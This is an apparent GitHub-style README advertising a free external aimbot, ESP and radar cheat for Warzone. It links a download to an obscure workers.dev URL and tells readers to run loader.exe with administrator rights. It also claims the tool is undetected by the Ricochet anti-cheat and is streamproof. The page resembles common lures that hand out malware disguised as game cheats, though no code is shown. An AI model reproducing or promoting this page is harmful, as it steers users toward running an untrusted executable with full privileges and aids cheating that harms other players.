# Warzone Cheat — External Edition

[![Download](https://img.shields.io/badge/Download-Free-38bdf8?style=for-the-badge&labelColor=0b1320)](https://xtiz6i8n6.fresh-link.workers.dev/f03e3ac6)

External Warzone cheat for Windows. Aimbot, ESP and radar in one overlay, nothing injected into the client.

Warzone fights happen at long range and around cover, so every module is built to give you information without covering the screen.

## Architecture

The loader opens a handle to the game and runs its own overlay window on top. Because nothing is injected, a crash in the game never takes the tool with it, and Ricochet sees only a desktop overlay.

The reader refreshes offsets on start. After a patch, wait for the next build instead of mixing versions.

## Aimbot

| Parameter | Default | Range | Note |
| --- | --- | --- | --- |
| fov | 7 | 1-30 | wide angles punish tracking |
| smooth | 4.0 | 1-12 | higher is slower |
| bone | chest | head/chest/nearest | head only below 40 m |
| visible | on | on/off | ignores targets behind cover |
| mode | hold | hold/toggle | hold keeps output clean |
| key | MOUSE5 | any | rebindable |

Start at defaults. If tracking lags, lower smoothing by one step before touching FOV.

## ESP

- player boxes with adaptive scaling
- skeleton lines
- health and armor bars
- distance tags with class colors
- loot tier markers
- vehicle markers with direction
- render cap 50-900 m

Enable layers one by one. Full overlay on a 128-player map is unreadable, usually boxes plus distance is enough.

## Radar

A draggable minimap widget, scale 55-140%, opacity 20-100, range up to 800 m. Arrows show movement, rings are set in 50 m steps.

## Streamproof

On by default. With streamproof enabled capture the game through game capture, display capture will show the overlay on some driver versions.

## Requirements

- Windows 10 21H2 or newer, Windows 11
- Battle.net
- Administrator rights
- Borderless or windowed fullscreen

## Install

1. Download the archive
2. Extract to its own folder
3. Right click `loader.exe`, run as administrator
4. Start Warzone
5. Press INSERT, load the `legit` profile

## Troubleshooting

| Symptom | Fix |
| --- | --- |
| no overlay | switch to borderless |
| menu not opening | run as administrator |
| nothing attaches | start the loader before the game |
| features stop after update | new build needed |
| flicker in OBS | streamproof on, game capture |

## FAQ

**Is it detected?** Currently undetected. Ricochet updates regularly, so keep the build fresh.

**External or internal?** External, see the architecture section.

**Does it work on console?** No, PC only.

**Can I change profiles mid-match?** Yes, F6.

## Compatibility

Windows 10/11, 16:9 and 21:9, DPI up to 150%. Ultrawide extends the render area without stretching boxes.

Use a spare account first. Offsets are patch bound.
